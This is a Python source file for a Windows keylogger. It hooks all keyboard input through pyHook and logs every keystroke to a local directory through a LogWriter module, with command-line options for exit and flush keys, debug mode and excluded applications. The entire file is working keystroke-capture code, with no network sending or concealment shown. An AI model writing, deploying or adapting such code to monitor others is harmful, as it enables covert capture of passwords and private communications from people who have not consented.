import pyHook
import time
import pythoncom
import sys
from optparse import OptionParser
import traceback
from logwriter import LogWriter

class KeyLogger:
    ''' Captures all keystrokes, calls LogWriter class to log them to disk
    '''
    def __init__(self): 
        
        self.ParseOptions()
        
        self.hm = pyHook.HookManager()
    
        self.hm.KeyDown = self.OnKeyboardEvent
    
        if self.options.hookKeyboard == True:
            self.hm.HookKeyboard()
        #if self.options.hookMouse == True:
        #    self.hm.HookMouse()
        
        self.lw = LogWriter(self.options.dirname, self.options.debug) 
        
        pythoncom.PumpMessages()
            

    def OnKeyboardEvent(self, event):
        '''This function is the stuff that's supposed to happen when a key is pressed.
        Calls LogWriter.WriteToLogFile with the keystroke properties.
        '''
        
        self.lw.WriteToLogFile(event, self.options)
        
        if event.Key == self.options.exitKey:
            sys.exit()
            
        return True
    
    def ParseOptions(self):
        '''Read command line options
        '''
                
        parser = OptionParser(version="%prog version 0.4.2")
        parser.add_option("-f", "--file", action="store", dest="dirname", help="write log data to DIRNAME [default: %default]")
        parser.add_option("-k", "--keyboard", action="store_true", dest="hookKeyboard", help="log keyboard input [default: %default]")
        parser.add_option("-a", "--addlinefeed", action="store_true", dest="addLineFeed", help="add linefeed [\\n] character when carriage return [\\r] character is detected (for Notepad compatibility) [default: %default]")
        parser.add_option("-b", "--parsebackspace", action="store_true", dest="parseBackspace", help="translate backspace chacarter into printable string [default: %default]")
        parser.add_option("-e", "--parseescape", action="store_true", dest="parseEscape", help="translate escape chacarter into printable string [default: %default]")

        parser.add_option("-x", "--exitkey", action="store", dest="exitKey", help="specify the key to press to exit keylogger [default: %default]")
        parser.add_option("-l", "--flushkey", action="store", dest="flushKey", help="specify the key to press to flush write buffer to file [default: %default]")
        parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
        
        parser.add_option("-n", "--nolog", action="append", dest="noLog", help="specify an application by full path name whose input will not be logged. repeat option for multiple applications. [default: %default]")
        
        parser.set_defaults(dirname=r"C:\Temp\logdir",
                            hookKeyboard=True,
                            addLineFeed=False,
                            parseBackspace=False,
                            parseEscape=False,
                            exitKey='F12',
                            flushKey='F11',
                            debug=False,
                            noLog=None)

        (self.options, args) = parser.parse_args()
            
if __name__ == '__main__':
    kl = KeyLogger()
    
    #if you want to change keylogger behavior from defaults, run it with commandline options. try '-h' for list of options.
    